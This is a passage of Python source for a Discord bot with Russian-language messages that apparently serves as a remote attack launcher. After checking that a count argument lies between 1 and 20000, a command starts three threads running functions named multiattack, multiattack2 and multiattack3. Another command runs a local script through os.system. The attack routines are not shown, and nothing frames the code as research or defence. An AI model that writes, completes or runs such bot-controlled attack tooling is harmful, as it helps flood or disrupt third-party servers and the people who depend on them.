            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if int(arg5) > 20000 or int(arg5) < 1:
        em = discord.Embed(
            title=f"Ошибка.",
            description=
            f"**ты банан, используй от 1 - 20000.**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    raffik = threading.Thread(target=multiattack)

    raffik.start()

    await ctx.send(embed=embed)

    raffik = threading.Thread(target=multiattack2)

    raffik.start()

    await ctx.send(embed=embed)

    raffik = threading.Thread(target=multiattack3)

    raffik.start()

    await ctx.send(embed=embed)

@raffik.command()
async def start(ctx):
    os.system(f"python index.py")
    os.system(f"")
    embed.add_field(name='Бот запущен', value='Test', inline=False)
    await ctx.send(embed=embed)

raffik.run(token)